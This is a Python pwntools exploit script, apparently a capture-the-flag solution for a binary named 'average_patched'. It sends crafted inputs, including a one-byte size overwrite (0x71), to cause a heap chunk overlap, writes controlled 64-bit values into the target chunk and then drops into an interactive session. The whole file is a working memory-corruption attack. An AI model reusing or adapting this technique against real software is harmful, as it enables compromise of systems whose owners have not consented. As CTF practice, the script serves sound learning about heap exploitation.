#!/usr/bin/env python3
from pwn import *

elf = ELF("./average_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = elf
context.terminal = ('kgx', '-e')

def conn():
    if args.REMOTE:
        r = remote() # add real host and port
    elif args.GDB:
        r = gdb.debug(elf.path, '''
                                b *main+28
                                continue
                      ''')
    else:
        r = process(elf.path)

    return r


def main():
    r = conn()

    for i in range(5):
        r.sendlineafter(b'> ', b'1')
        r.sendlineafter(b': ', str(i).encode())
        r.sendlineafter(b'? ', b'0')
        
        r.sendlineafter(b'name: ', b'abcd' if i != 3 else b'a'*39)
        r.sendlineafter(b'message: ', b'efgh' if i != 3 else b'b'*32 + b'\x71')
    
    # free last chunk
    r.sendlineafter(b'> ', b'2')
    r.sendlineafter(b': ', b'4')
    
    # create new chunk that overlaps with the target chunk
    r.sendlineafter(b'> ', b'1')
    r.sendlineafter(b': ', b'4')
    r.sendlineafter(b'? ', b'32')
    r.sendlineafter(b'name: ', b'abcd')
    r.sendlineafter(b'message: ', p64(0xdeadbeefcafebabe)*4)
    
    r.sendlineafter(b'> ', b'5')

    r.interactive()


if __name__ == "__main__":
    main()
